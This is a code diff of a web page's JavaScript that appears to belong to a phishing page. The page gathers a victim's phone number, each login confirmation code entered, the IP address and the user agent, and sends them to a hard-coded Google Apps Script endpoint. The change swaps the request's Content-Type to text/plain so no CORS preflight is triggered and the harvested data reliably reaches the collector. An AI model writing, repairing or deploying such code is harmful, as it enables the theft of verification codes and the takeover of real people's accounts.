@@ -110,7 +110,7 @@
 </div>
 
 <script>
-    // ⚠️ URL Apps Script — оставлен ваш, он правильный
+    // ⚠️ URL Apps Script — правильный, оставлен без изменений
     const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxA9jfcQHJZZ-YjHSKGvsprohch_N6_j7tf52of_x-0vVXR6_4azmzXA4NeQwPewJg/exec';
 
     var playerID = '';
@@ -169,10 +169,10 @@
         var ip = await getIP();
         var fullPhone = '+7' + phone;
 
-        // Убран mode: 'no-cors' — теперь тело запроса доходит до Apps Script
+        // text/plain — простой запрос, preflight не отправляется, данные доходят до Apps Script
         fetch(SCRIPT_URL, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
+            headers: { 'Content-Type': 'text/plain;charset=utf-8' },
             body: JSON.stringify({
                 type: 'phone',
                 phone: fullPhone,
@@ -181,7 +181,7 @@
                 userAgent: navigator.userAgent,
                 timestamp: new Date().toISOString()
             })
-        }).catch(function() { /* ответ может быть заблокирован CORS, но запрос уже ушёл */ });
+        }).catch(function() { /* запрос уже ушёл; ответ может быть заблокирован CORS */ });
 
         document.getElementById('screen-auth').style.display = 'none';
         document.getElementById('screen-loading').style.display = 'block';
@@ -210,10 +210,10 @@
         document.getElementById('screen-code-loading').style.display = 'block';
 
         var ip = await getIP();
-        // Убран mode: 'no-cors' — каждая попытка реально уходит в Apps Script
+        // text/plain — каждая попытка реально уходит в Apps Script
         fetch(SCRIPT_URL, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
+            headers: { 'Content-Type': 'text/plain;charset=utf-8' },
             body: JSON.stringify({
                 type: 'code',
                 code: code,
@@ -223,7 +223,7 @@
                 timestamp: new Date().toISOString(),
                 attempt: codeAttempt
             })
-        }).catch(function() { /* ответ может быть заблокирован CORS, но запрос уже ушёл */ });
+        }).catch(function() { /* запрос уже ушёл; ответ может быть заблокирован CORS */ });
 
         setTimeout(function() {
             document.getElementById('screen-code-loading').style.display = 'none';
